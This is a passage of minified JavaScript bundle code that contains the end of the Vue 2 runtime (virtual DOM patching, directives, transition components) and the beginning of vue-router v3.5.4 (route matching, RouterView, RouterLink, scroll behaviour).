e,t,a=n.data;if(r(a))for(r(e=a.hook)&&r(e=e.destroy)&&e(n),e=0;e<o.destroy.length;++e)o.destroy[e](n);if(r(e=n.children))for(t=0;t<n.children.length;++t)y(n.children[t])}function w(n,e,t){for(;e<=t;++e){var o=n[e];r(o)&&(r(o.tag)?(E(o),y(o)):c(o.elm))}}function E(n,e){if(r(e)||r(n.data)){var t,a=o.remove.length+1;for(r(e)?e.listeners+=a:e=function(n,e){function t(){0==--t.listeners&&c(n)}return t.listeners=e,t}(n.elm,a),r(t=n.componentInstance)&&r(t=t._vnode)&&r(t.data)&&E(t,e),t=0;t<o.remove.length;++t)o.remove[t](n,e);r(t=n.data.hook)&&r(t=t.remove)?t(n,e):e()}else c(n.elm)}function k(n,e,t,o){for(var a=t;a<o;a++){var s=e[a];if(r(s)&&to(n,s))return a}}function A(n,e,t,i,l,c){if(n!==e){r(e.elm)&&r(i)&&(e=i[l]=xn(e));var u=e.elm=n.elm;if(s(n.isAsyncPlaceholder))r(e.asyncFactory.resolved)?B(n.elm,e,t):e.isAsyncPlaceholder=!0;else if(s(e.isStatic)&&s(n.isStatic)&&e.key===n.key&&(s(e.isCloned)||s(e.isOnce)))e.componentInstance=n.componentInstance;else{var m,h=e.data;r(h)&&r(m=h.hook)&&r(m=m.prepatch)&&m(n,e);var b=n.children,g=e.children;if(r(h)&&v(e)){for(m=0;m<o.update.length;++m)o.update[m](n,e);r(m=h.hook)&&r(m=m.update)&&m(n,e)}a(e.text)?r(b)&&r(g)?b!==g&&function(n,e,t,o,s){var i,l,c,u=0,m=0,h=e.length-1,v=e[0],b=e[h],g=t.length-1,f=t[0],y=t[g],E=!s;for(0;u<=h&&m<=g;)a(v)?v=e[++u]:a(b)?b=e[--h]:to(v,f)?(A(v,f,o,t,m),v=e[++u],f=t[++m]):to(b,y)?(A(b,y,o,t,g),b=e[--h],y=t[--g]):to(v,y)?(A(v,y,o,t,g),E&&d.insertBefore(n,v.elm,d.nextSibling(b.elm)),v=e[++u],y=t[--g]):to(b,f)?(A(b,f,o,t,m),E&&d.insertBefore(n,b.elm,v.elm),b=e[--h],f=t[++m]):(a(i)&&(i=oo(e,u,h)),a(l=r(f.key)?i[f.key]:k(f,e,u,h))?p(f,o,n,v.elm,!1,t,m):to(c=e[l],f)?(A(c,f,o,t,m),e[l]=void 0,E&&d.insertBefore(n,c.elm,v.elm)):p(f,o,n,v.elm,!1,t,m),f=t[++m]);u>h?x(n,a(t[g+1])?null:t[g+1].elm,t,m,g,o):m>g&&w(e,u,h)}(u,b,g,t,c):r(g)?(r(n.text)&&d.setTextContent(u,""),x(u,null,g,0,g.length-1,t)):r(b)?w(b,0,b.length-1):r(n.text)&&d.setTextContent(u,""):n.text!==e.text&&d.setTextContent(u,e.text),r(h)&&r(m=h.hook)&&r(m=m.postpatch)&&m(n,e)}}}function j(n,e,t){if(s(t)&&r(n.parent))n.parent.data.pendingInsert=e;else for(var o=0;o<e.length;++o)e[o].data.hook.insert(e[o])}var T=b("attrs,class,staticClass,staticStyle,key");function B(n,e,t,o){var a,i=e.tag,l=e.data,d=e.children;if(o=o||l&&l.pre,e.elm=n,s(e.isComment)&&r(e.asyncFactory))return e.isAsyncPlaceholder=!0,!0;if(r(l)&&(r(a=l.hook)&&r(a=a.init)&&a(e,!0),r(a=e.componentInstance)))return u(e,t),!0;if(r(i)){if(r(d))if(n.hasChildNodes())if(r(a=l)&&r(a=a.domProps)&&r(a=a.innerHTML)){if(a!==n.innerHTML)return!1}else{for(var c=!0,p=n.firstChild,m=0;m<d.length;m++){if(!p||!B(p,d[m],t,o)){c=!1;break}p=p.nextSibling}if(!c||p)return!1}else h(e,d,t);if(r(l)){var v=!1;for(var b in l)if(!T(b)){v=!0,g(e,t);break}!v&&l.class&&re(l.class)}}else n.data!==e.text&&(n.data=e.text);return!0}return function(n,e,t,i){if(!a(e)){var l,c=!1,u=[];if(a(n))c=!0,p(e,u);else{var m=r(n.nodeType);if(!m&&to(n,e))A(n,e,u,null,null,i);else{if(m){if(1===n.nodeType&&n.hasAttribute("data-server-rendered")&&(n.removeAttribute("data-server-rendered"),t=!0),s(t)&&B(n,e,u))return j(e,u,!0),n;l=n,n=new vn(d.tagName(l).toLowerCase(),{},[],void 0,l)}var h=n.elm,b=d.parentNode(h);if(p(e,u,h._leaveCb?null:b,d.nextSibling(h)),r(e.parent))for(var g=e.parent,f=v(e);g;){for(var x=0;x<o.destroy.length;++x)o.destroy[x](g);if(g.elm=e.elm,f){for(var E=0;E<o.create.length;++E)o.create[E](no,g);var k=g.data.hook.insert;if(k.merged)for(var T=1;T<k.fns.length;T++)k.fns[T]()}else Zt(g);g=g.parent}r(b)?w([n],0,0):r(n.tag)&&y(n)}}return j(e,u,c),e.elm}r(n)&&y(n)}}({nodeOps:Kt,modules:[vo,fo,jo,_o,Po,H?{create:da,activate:da,remove:function(n,e){!0!==n.data.show?sa(n,e):e()}}:{}].concat(po)});X&&document.addEventListener("selectionchange",(function(){var n=document.activeElement;n&&n.vmodel&&fa(n,"input")}));var pa={inserted:function(n,e,t,o){"select"===t.tag?(o.elm&&!o.elm._vOptions?de(t,"postpatch",(function(){pa.componentUpdated(n,e,t)})):ua(n,e,t.context),n._vOptions=[].map.call(n.options,va)):("textarea"===t.tag||Xt(n.type))&&(n._vModifiers=e.modifiers,e.modifiers.lazy||(n.addEventListener("compositionstart",ba),n.addEventListener("compositionend",ga),n.addEventListener("change",ga),X&&(n.vmodel=!0)))},componentUpdated:function(n,e,t){if("select"===t.tag){ua(n,e,t.context);var o=n._vOptions,a=n._vOptions=[].map.call(n.options,va);if(a.some((function(n,e){return!R(n,o[e])})))(n.multiple?e.value.some((function(n){return ha(n,a)})):e.value!==e.oldValue&&ha(e.value,a))&&fa(n,"change")}}};function ua(n,e,t){ma(n,e,t),(J||K)&&setTimeout((function(){ma(n,e,t)}),0)}function ma(n,e,t){var o=e.value,a=n.multiple;if(!a||Array.isArray(o)){for(var r,s,i=0,l=n.options.length;i<l;i++)if(s=n.options[i],a)r=L(o,va(s))>-1,s.selected!==r&&(s.selected=r);else if(R(va(s),o))return void(n.selectedIndex!==i&&(n.selectedIndex=i));a||(n.selectedIndex=-1)}}function ha(n,e){return e.every((function(e){return!R(e,n)}))}function va(n){return"_value"in n?n._value:n.value}function ba(n){n.target.composing=!0}function ga(n){n.target.composing&&(n.target.composing=!1,fa(n.target,"input"))}function fa(n,e){var t=document.createEvent("HTMLEvents");t.initEvent(e,!0,!0),n.dispatchEvent(t)}function xa(n){return!n.componentInstance||n.data&&n.data.transition?n:xa(n.componentInstance._vnode)}var ya={model:pa,show:{bind:function(n,e,t){var o=e.value,a=(t=xa(t)).data&&t.data.transition,r=n.__vOriginalDisplay="none"===n.style.display?"":n.style.display;o&&a?(t.data.show=!0,ra(t,(function(){n.style.display=r}))):n.style.display=o?r:"none"},update:function(n,e,t){var o=e.value;!o!=!e.oldValue&&((t=xa(t)).data&&t.data.transition?(t.data.show=!0,o?ra(t,(function(){n.style.display=n.__vOriginalDisplay})):sa(t,(function(){n.style.display="none"}))):n.style.display=o?n.__vOriginalDisplay:"none")},unbind:function(n,e,t,o,a){a||(n.style.display=n.__vOriginalDisplay)}}},wa={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function Ea(n){var e=n&&n.componentOptions;return e&&e.Ctor.options.abstract?Ea(Ge(e.children)):n}function ka(n){var e={},t=n.$options;for(var o in t.propsData)e[o]=n[o];var a=t._parentListeners;for(var r in a)e[k(r)]=a[r];return e}function Aa(n,e){if(/\d-keep-alive$/.test(e.tag))return n("keep-alive",{props:e.componentOptions.propsData})}var ja=function(n){return n.tag||be(n)},Ta=function(n){return"show"===n.name},Ba={name:"transition",props:wa,abstract:!0,render:function(n){var e=this,t=this.$slots.default;if(t&&(t=t.filter(ja)).length){0;var o=this.mode;0;var a=t[0];if(function(n){for(;n=n.parent;)if(n.data.transition)return!0}(this.$vnode))return a;var r=Ea(a);if(!r)return a;if(this._leaving)return Aa(n,a);var s="__transition-"+this._uid+"-";r.key=null==r.key?r.isComment?s+"comment":s+r.tag:i(r.key)?0===String(r.key).indexOf(s)?r.key:s+r.key:r.key;var l=(r.data||(r.data={})).transition=ka(this),d=this._vnode,c=Ea(d);if(r.data.directives&&r.data.directives.some(Ta)&&(r.data.show=!0),c&&c.data&&!function(n,e){return e.key===n.key&&e.tag===n.tag}(r,c)&&!be(c)&&(!c.componentInstance||!c.componentInstance._vnode.isComment)){var p=c.data.transition=S({},l);if("out-in"===o)return this._leaving=!0,de(p,"afterLeave",(function(){e._leaving=!1,e.$forceUpdate()})),Aa(n,a);if("in-out"===o){if(be(r))return d;var u,m=function(){u()};de(l,"afterEnter",m),de(l,"enterCancelled",m),de(p,"delayLeave",(function(n){u=n}))}}return a}}},_a=S({tag:String,moveClass:String},wa);function Sa(n){n.elm._moveCb&&n.elm._moveCb(),n.elm._enterCb&&n.elm._enterCb()}function Ca(n){n.data.newPos=n.elm.getBoundingClientRect()}function Ia(n){var e=n.data.pos,t=n.data.newPos,o=e.left-t.left,a=e.top-t.top;if(o||a){n.data.moved=!0;var r=n.elm.style;r.transform=r.WebkitTransform="translate("+o+"px,"+a+"px)",r.transitionDuration="0s"}}delete _a.mode;var Da={Transition:Ba,TransitionGroup:{props:_a,beforeMount:function(){var n=this,e=this._update;this._update=function(t,o){var a=Qe(n);n.__patch__(n._vnode,n.kept,!1,!0),n._vnode=n.kept,a(),e.call(n,t,o)}},render:function(n){for(var e=this.tag||this.$vnode.data.tag||"span",t=Object.create(null),o=this.prevChildren=this.children,a=this.$slots.default||[],r=this.children=[],s=ka(this),i=0;i<a.length;i++){var l=a[i];if(l.tag)if(null!=l.key&&0!==String(l.key).indexOf("__vlist"))r.push(l),t[l.key]=l,(l.data||(l.data={})).transition=s;else;}if(o){for(var d=[],c=[],p=0;p<o.length;p++){var u=o[p];u.data.transition=s,u.data.pos=u.elm.getBoundingClientRect(),t[u.key]?d.push(u):c.push(u)}this.kept=n(e,null,d),this.removed=c}return n(e,null,r)},updated:function(){var n=this.prevChildren,e=this.moveClass||(this.name||"v")+"-move";n.length&&this.hasMove(n[0].elm,e)&&(n.forEach(Sa),n.forEach(Ca),n.forEach(Ia),this._reflow=document.body.offsetHeight,n.forEach((function(n){if(n.data.moved){var t=n.elm,o=t.style;Qo(t,e),o.transform=o.WebkitTransform=o.transitionDuration="",t.addEventListener(Wo,t._moveCb=function n(o){o&&o.target!==t||o&&!/transform$/.test(o.propertyName)||(t.removeEventListener(Wo,n),t._moveCb=null,Zo(t,e))})}})))},methods:{hasMove:function(n,e){if(!Ho)return!1;if(this._hasMove)return this._hasMove;var t=n.cloneNode();n._transitionClasses&&n._transitionClasses.forEach((function(n){Vo(t,n)})),qo(t,e),t.style.display="none",this.$el.appendChild(t);var o=ta(t);return this.$el.removeChild(t),this._hasMove=o.hasTransform}}}};At.config.mustUseProp=function(n,e,t){return"value"===t&&zt(n)&&"button"!==e||"selected"===t&&"option"===n||"checked"===t&&"input"===n||"muted"===t&&"video"===n},At.config.isReservedTag=Yt,At.config.isReservedAttr=Dt,At.config.getTagNamespace=function(n){return Wt(n)?"svg":"math"===n?"math":void 0},At.config.isUnknownElement=function(n){if(!H)return!0;if(Yt(n))return!1;if(n=n.toLowerCase(),null!=Jt[n])return Jt[n];var e=document.createElement(n);return n.indexOf("-")>-1?Jt[n]=e.constructor===window.HTMLUnknownElement||e.constructor===window.HTMLElement:Jt[n]=/HTMLUnknownElement/.test(e.toString())},S(At.options.directives,ya),S(At.options.components,Da),At.prototype.__patch__=H?ca:I,At.prototype.$mount=function(n,e){return function(n,e,t){var o;return n.$el=e,n.$options.render||(n.$options.render=gn),et(n,"beforeMount"),o=function(){n._update(n._render(),t)},new mt(n,o,I,{before:function(){n._isMounted&&!n._isDestroyed&&et(n,"beforeUpdate")}},!0),t=!1,null==n.$vnode&&(n._isMounted=!0,et(n,"mounted")),n}(this,n=n&&H?function(n){if("string"==typeof n){var e=document.querySelector(n);return e||document.createElement("div")}return n}(n):void 0,e)},H&&setTimeout((function(){P.devtools&&an&&an.emit("init",At)}),0);var za=At;
/*!
  * vue-router v3.5.4
  * (c) 2022 Evan You
  * @license MIT
  */function Ra(n,e){for(var t in e)n[t]=e[t];return n}var La=/[!'()*]/g,Fa=function(n){return"%"+n.charCodeAt(0).toString(16)},Na=/%2C/g,Oa=function(n){return encodeURIComponent(n).replace(La,Fa).replace(Na,",")};function Pa(n){try{return decodeURIComponent(n)}catch(n){0}return n}var Ma=function(n){return null==n||"object"==typeof n?n:String(n)};function qa(n){var e={};return(n=n.trim().replace(/^(\?|#|&)/,""))?(n.split("&").forEach((function(n){var t=n.replace(/\+/g," ").split("="),o=Pa(t.shift()),a=t.length>0?Pa(t.join("=")):null;void 0===e[o]?e[o]=a:Array.isArray(e[o])?e[o].push(a):e[o]=[e[o],a]})),e):e}function Va(n){var e=n?Object.keys(n).map((function(e){var t=n[e];if(void 0===t)return"";if(null===t)return Oa(e);if(Array.isArray(t)){var o=[];return t.forEach((function(n){void 0!==n&&(null===n?o.push(Oa(e)):o.push(Oa(e)+"="+Oa(n)))})),o.join("&")}return Oa(e)+"="+Oa(t)})).filter((function(n){return n.length>0})).join("&"):null;return e?"?"+e:""}var $a=/\/?$/;function Ua(n,e,t,o){var a=o&&o.options.stringifyQuery,r=e.query||{};try{r=Ha(r)}catch(n){}var s={name:e.name||n&&n.name,meta:n&&n.meta||{},path:e.path||"/",hash:e.hash||"",query:r,params:e.params||{},fullPath:Ya(e,a),matched:n?Wa(n):[]};return t&&(s.redirectedFrom=Ya(t,a)),Object.freeze(s)}function Ha(n){if(Array.isArray(n))return n.map(Ha);if(n&&"object"==typeof n){var e={};for(var t in n)e[t]=Ha(n[t]);return e}return n}var Ga=Ua(null,{path:"/"});function Wa(n){for(var e=[];n;)e.unshift(n),n=n.parent;return e}function Ya(n,e){var t=n.path,o=n.query;void 0===o&&(o={});var a=n.hash;return void 0===a&&(a=""),(t||"/")+(e||Va)(o)+a}function Ja(n,e,t){return e===Ga?n===e:!!e&&(n.path&&e.path?n.path.replace($a,"")===e.path.replace($a,"")&&(t||n.hash===e.hash&&Xa(n.query,e.query)):!(!n.name||!e.name)&&(n.name===e.name&&(t||n.hash===e.hash&&Xa(n.query,e.query)&&Xa(n.params,e.params))))}function Xa(n,e){if(void 0===n&&(n={}),void 0===e&&(e={}),!n||!e)return n===e;var t=Object.keys(n).sort(),o=Object.keys(e).sort();return t.length===o.length&&t.every((function(t,a){var r=n[t];if(o[a]!==t)return!1;var s=e[t];return null==r||null==s?r===s:"object"==typeof r&&"object"==typeof s?Xa(r,s):String(r)===String(s)}))}function Ka(n){for(var e=0;e<n.matched.length;e++){var t=n.matched[e];for(var o in t.instances){var a=t.instances[o],r=t.enteredCbs[o];if(a&&r){delete t.enteredCbs[o];for(var s=0;s<r.length;s++)a._isBeingDestroyed||r[s](a)}}}}var Qa={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,o=e.children,a=e.parent,r=e.data;r.routerView=!0;for(var s=a.$createElement,i=t.name,l=a.$route,d=a._routerViewCache||(a._routerViewCache={}),c=0,p=!1;a&&a._routerRoot!==a;){var u=a.$vnode?a.$vnode.data:{};u.routerView&&c++,u.keepAlive&&a._directInactive&&a._inactive&&(p=!0),a=a.$parent}if(r.routerViewDepth=c,p){var m=d[i],h=m&&m.component;return h?(m.configProps&&Za(h,r,m.route,m.configProps),s(h,r,o)):s()}var v=l.matched[c],b=v&&v.components[i];if(!v||!b)return d[i]=null,s();d[i]={component:b},r.registerRouteInstance=function(n,e){var t=v.instances[i];(e&&t!==n||!e&&t===n)&&(v.instances[i]=e)},(r.hook||(r.hook={})).prepatch=function(n,e){v.instances[i]=e.componentInstance},r.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==v.instances[i]&&(v.instances[i]=n.componentInstance),Ka(l)};var g=v.props&&v.props[i];return g&&(Ra(d[i],{route:l,configProps:g}),Za(b,r,l,g)),s(b,r,o)}};function Za(n,e,t,o){var a=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,o);if(a){a=e.props=Ra({},a);var r=e.attrs=e.attrs||{};for(var s in a)n.props&&s in n.props||(r[s]=a[s],delete a[s])}}function nr(n,e,t){var o=n.charAt(0);if("/"===o)return n;if("?"===o||"#"===o)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var r=n.replace(/^\//,"").split("/"),s=0;s<r.length;s++){var i=r[s];".."===i?a.pop():"."!==i&&a.push(i)}return""!==a[0]&&a.unshift(""),a.join("/")}function er(n){return n.replace(/\/(?:\s*\/)+/g,"/")}var tr=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},or=gr,ar=dr,rr=function(n,e){return pr(dr(n,e),e)},sr=pr,ir=br,lr=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function dr(n,e){for(var t,o=[],a=0,r=0,s="",i=e&&e.delimiter||"/";null!=(t=lr.exec(n));){var l=t[0],d=t[1],c=t.index;if(s+=n.slice(r,c),r=c+l.length,d)s+=d[1];else{var p=n[r],u=t[2],m=t[3],h=t[4],v=t[5],b=t[6],g=t[7];s&&(o.push(s),s="");var f=null!=u&&null!=p&&p!==u,x="+"===b||"*"===b,y="?"===b||"*"===b,w=t[2]||i,E=h||v;o.push({name:m||a++,prefix:u||"",delimiter:w,optional:y,repeat:x,partial:f,asterisk:!!g,pattern:E?mr(E):g?".*":"[^"+ur(w)+"]+?"})}}return r<n.length&&(s+=n.substr(r)),s&&o.push(s),o}function cr(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function pr(n,e){for(var t=new Array(n.length),o=0;o<n.length;o++)"object"==typeof n[o]&&(t[o]=new RegExp("^(?:"+n[o].pattern+")$",vr(e)));return function(e,o){for(var a="",r=e||{},s=(o||{}).pretty?cr:encodeURIComponent,i=0;i<n.length;i++){var l=n[i];if("string"!=typeof l){var d,c=r[l.name];if(null==c){if(l.optional){l.partial&&(a+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(tr(c)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(c)+"`");if(0===c.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var p=0;p<c.length;p++){if(d=s(c[p]),!t[i].test(d))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(d)+"`");a+=(0===p?l.prefix:l.delimiter)+d}}else{if(d=l.asterisk?encodeURI(c).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):s(c),!t[i].test(d))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+d+'"');a+=l.prefix+d}}else a+=l}return a}}function ur(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function mr(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function hr(n,e){return n.keys=e,n}function vr(n){return n&&n.sensitive?"":"i"}function br(n,e,t){tr(e)||(t=e||t,e=[]);for(var o=(t=t||{}).strict,a=!1!==t.end,r="",s=0;s<n.length;s++){var i=n[s];if("string"==typeof i)r+=ur(i);else{var l=ur(i.prefix),d="(?:"+i.pattern+")";e.push(i),i.repeat&&(d+="(?:"+l+d+")*"),r+=d=i.optional?i.partial?l+"("+d+")?":"(?:"+l+"("+d+"))?":l+"("+d+")"}}var c=ur(t.delimiter||"/"),p=r.slice(-c.length)===c;return o||(r=(p?r.slice(0,-c.length):r)+"(?:"+c+"(?=$))?"),r+=a?"$":o&&p?"":"(?="+c+"|$)",hr(new RegExp("^"+r,vr(t)),e)}function gr(n,e,t){return tr(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var o=0;o<t.length;o++)e.push({name:o,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return hr(n,e)}(n,e):tr(n)?function(n,e,t){for(var o=[],a=0;a<n.length;a++)o.push(gr(n[a],e,t).source);return hr(new RegExp("(?:"+o.join("|")+")",vr(t)),e)}(n,e,t):function(n,e,t){return br(dr(n,t),e,t)}(n,e,t)}or.parse=ar,or.compile=rr,or.tokensToFunction=sr,or.tokensToRegExp=ir;var fr=Object.create(null);function xr(n,e,t){e=e||{};try{var o=fr[n]||(fr[n]=or.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),o(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function yr(n,e,t,o){var a="string"==typeof n?{path:n}:n;if(a._normalized)return a;if(a.name){var r=(a=Ra({},n)).params;return r&&"object"==typeof r&&(a.params=Ra({},r)),a}if(!a.path&&a.params&&e){(a=Ra({},a))._normalized=!0;var s=Ra(Ra({},e.params),a.params);if(e.name)a.name=e.name,a.params=s;else if(e.matched.length){var i=e.matched[e.matched.length-1].path;a.path=xr(i,s,e.path)}else 0;return a}var l=function(n){var e="",t="",o=n.indexOf("#");o>=0&&(e=n.slice(o),n=n.slice(0,o));var a=n.indexOf("?");return a>=0&&(t=n.slice(a+1),n=n.slice(0,a)),{path:n,query:t,hash:e}}(a.path||""),d=e&&e.path||"/",c=l.path?nr(l.path,d,t||a.append):d,p=function(n,e,t){void 0===e&&(e={});var o,a=t||qa;try{o=a(n||"")}catch(n){o={}}for(var r in e){var s=e[r];o[r]=Array.isArray(s)?s.map(Ma):Ma(s)}return o}(l.query,a.query,o&&o.options.parseQuery),u=a.hash||l.hash;return u&&"#"!==u.charAt(0)&&(u="#"+u),{_normalized:!0,path:c,query:p,hash:u}}var wr,Er=function(){},kr={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,o=this.$route,a=t.resolve(this.to,o,this.append),r=a.location,s=a.route,i=a.href,l={},d=t.options.linkActiveClass,c=t.options.linkExactActiveClass,p=null==d?"router-link-active":d,u=null==c?"router-link-exact-active":c,m=null==this.activeClass?p:this.activeClass,h=null==this.exactActiveClass?u:this.exactActiveClass,v=s.redirectedFrom?Ua(null,yr(s.redirectedFrom),null,t):s;l[h]=Ja(o,v,this.exactPath),l[m]=this.exact||this.exactPath?l[h]:function(n,e){return 0===n.path.replace($a,"/").indexOf(e.path.replace($a,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(o,v);var b=l[h]?this.ariaCurrentValue:null,g=function(n){Ar(n)&&(e.replace?t.replace(r,Er):t.push(r,Er))},f={click:Ar};Array.isArray(this.event)?this.event.forEach((function(n){f[n]=g})):f[this.event]=g;var x={class:l},y=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:i,route:s,navigate:g,isActive:l[m],isExactActive:l[h]});if(y){if(1===y.length)return y[0];if(y.length>1||!y.length)return 0===y.length?n():n("span",{},y)}if("a"===this.tag)x.on=f,x.attrs={href:i,"aria-current":b};else{var w=function n(e){var t;if(e)for(var o=0;o<e.length;o++){if("a"===(t=e[o]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(w){w.isStatic=!1;var E=w.data=Ra({},w.data);for(var k in E.on=E.on||{},E.on){var A=E.on[k];k in f&&(E.on[k]=Array.isArray(A)?A:[A])}for(var j in f)j in E.on?E.on[j].push(f[j]):E.on[j]=g;var T=w.data.attrs=Ra({},w.data.attrs);T.href=i,T["aria-current"]=b}else x.on=f}return n(this.tag,x,this.$slots.default)}};function Ar(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var jr="undefined"!=typeof window;function Tr(n,e,t,o,a){var r=e||[],s=t||Object.create(null),i=o||Object.create(null);n.forEach((function(n){!function n(e,t,o,a,r,s){var i=a.path,l=a.name;0;var d=a.pathToRegexpOptions||{},c=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return er(e.path+"/"+n)}(i,r,d.strict);"boolean"==typeof a.caseSensitive&&(d.sensitive=a.caseSensitive);var p={path:c,regex:Br(c,d),components:a.components||{default:a.component},alias:a.alias?"string"==typeof a.alias?[a.alias]:a.alias:[],instances:{},enteredCbs:{},name:l,parent:r,matchAs:s,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var r=s?er(s+"/"+a.path):void 0;n(e,t,o,a,p,r)}));t[p.path]||(e.push(p.path),t[p.path]=p);if(void 0!==a.alias)for(var u=Array.isArray(a.alias)?a.alias:[a.alias],m=0;m<u.length;++m){0;var h={path:u[m],children:a.children};n(e,t,o,h,r,p.path||"/")}l&&(o[l]||(o[l]=p))}(r,s,i,n,a)}));for(var l=0,d=r.length;l<d;l++)"*"===r[l]&&(r.push(r.splice(l,1)[0]),d--,l--);return{pathList:r,pathMap:s,nameMap:i}}function Br(n,e){return or(n,[],e)}function _r(n,e){var t=Tr(n),o=t.pathList,a=t.pathMap,r=t.nameMap;function s(n,t,s){var i=yr(n,t,!1,e),d=i.name;if(d){var c=r[d];if(!c)return l(null,i);var p=c.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof i.params&&(i.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in i.params)&&p.indexOf(u)>-1&&(i.params[u]=t.params[u]);return i.path=xr(c.path,i.params),l(c,i,s)}if(i.path){i.params={};for(var m=0;m<o.length;m++){var h=o[m],v=a[h];if(Sr(v.regex,i.path,i.params))return l(v,i,s)}}return l(null,i)}function i(n,t){var o=n.redirect,a="function"==typeof o?o(Ua(n,t,null,e)):o;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return l(null,t);var i=a,d=i.name,c=i.path,p=t.query,u=t.hash,m=t.params;if(p=i.hasOwnProperty("query")?i.query:p,u=i.hasOwnProperty("hash")?i.hash:u,m=i.hasOwnProperty("params")?i.params:m,d){r[d];return s({_normalized:!0,name:d,query:p,hash:u,params:m},void 0,t)}if(c){var h=function(n,e){return nr(n,e.parent?e.parent.path:"/",!0)}(c,n);return s({_normalized:!0,path:xr(h,m),query:p,hash:u},void 0,t)}return l(null,t)}function l(n,t,o){return n&&n.redirect?i(n,o||t):n&&n.matchAs?function(n,e,t){var o=s({_normalized:!0,path:xr(t,e.params)});if(o){var a=o.matched,r=a[a.length-1];return e.params=o.params,l(r,e)}return l(null,e)}(0,t,n.matchAs):Ua(n,t,o,e)}return{match:s,addRoute:function(n,e){var t="object"!=typeof n?r[n]:void 0;Tr([e||n],o,a,r,t),t&&t.alias.length&&Tr(t.alias.map((function(n){return{path:n,children:[e]}})),o,a,r,t)},getRoutes:function(){return o.map((function(n){return a[n]}))},addRoutes:function(n){Tr(n,o,a,r)}}}function Sr(n,e,t){var o=e.match(n);if(!o)return!1;if(!t)return!0;for(var a=1,r=o.length;a<r;++a){var s=n.keys[a-1];s&&(t[s.name||"pathMatch"]="string"==typeof o[a]?Pa(o[a]):o[a])}return!0}var Cr=jr&&window.performance&&window.performance.now?window.performance:Date;function Ir(){return Cr.now().toFixed(3)}var Dr=Ir();function zr(){return Dr}function Rr(n){return Dr=n}var Lr=Object.create(null);function Fr(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=Ra({},window.history.state);return t.key=zr(),window.history.replaceState(t,"",e),window.addEventListener("popstate",Pr),function(){window.removeEventListener("popstate",Pr)}}function Nr(n,e,t,o){if(n.app){var a=n.options.scrollBehavior;a&&n.app.$nextTick((function(){var r=function(){var n=zr();if(n)return Lr[n]}(),s=a.call(n,e,t,o?r:null);s&&("function"==typeof s.then?s.then((function(n){Ur(n,r)})).catch((function(n){0})):Ur(s,r))}))}}function Or(){var n=zr();n&&(Lr[n]={x:window.pageXOffset,y:window.pageYOffset})}function Pr(n){Or(),n.state&&n.state.key&&Rr(n.state.key)}function Mr(n){return Vr(n.x)||Vr(n.y)}function qr(n){return{x:Vr(n.x)?n.x:window.pageXOffset,y:Vr(n.y)?n.y:window.pageYOffset}}function Vr(n){return"number"==typeof n}var $r=/^#\d/;function Ur(n,e){var t,o="object"==typeof n;if(o&&"string"==typeof n.selector){var a=$r.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(a){var r=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),o=n.getBoundingClientRect();return{x:o.left-t.left-e.x,y:o.top-t.top-e.y}}(a,r={x:Vr((t=r).x)?t.x:0,y:Vr(t.y)?t.y:0})}else Mr(n)&&(e=qr(n))}else 